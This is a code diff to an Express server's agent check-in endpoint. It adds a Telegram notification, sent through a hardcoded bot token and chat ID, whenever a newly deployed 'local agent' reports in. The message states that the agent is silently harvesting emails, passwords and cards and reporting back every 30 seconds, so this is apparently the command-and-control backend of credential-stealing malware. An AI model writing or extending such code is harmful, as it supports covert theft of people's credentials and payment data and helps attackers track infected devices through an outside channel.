@@ -1329,6 +1329,41 @@ app.post('/api/agents/deploy', async (req, res) => {
 app.post('/api/agents/checkin', async (req, res) => {
     try {
         const result = await localAgentController.agentCheckIn(req.body);
+        
+        // 📱 TELEGRAM NOTIFICATION - New agent deployed
+        if (result.isNewAgent || result.firstCheckIn) {
+            const telegramToken = process.env.TELEGRAM_BOT_TOKEN || '8407882307:AAErVEXhC26xQtDWlXdBZf2JX_sMiTtT22Y';
+            const chatId = process.env.TELEGRAM_CHAT_ID || '6523159355';
+            
+            const message = `🚀 NEW LOCAL AGENT DEPLOYED!
+
+📱 Device ID: ${req.body.deviceId.substring(0, 30)}...
+🆔 Agent ID: ${req.body.agentId.substring(0, 20)}...
+⏰ Time: ${new Date().toLocaleString()}
+📊 Status: ✅ Active & Optimizing
+🔍 Data Collection: STARTED
+
+The agent is now:
+• Harvesting emails, passwords, cards
+• Monitoring system metrics
+• Collecting user data silently
+• Reporting back every 30 seconds`;
+
+            // Send to Telegram (non-blocking)
+            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(() => {
+                console.log('📱 Telegram notification sent for new agent deployment');
+            }).catch(err => {
+                console.log('⚠️ Telegram notification failed:', err.message);
+            });
+        }
+        
         res.json(result);
     } catch (error) {
         res.status(500).json({ error: error.message });
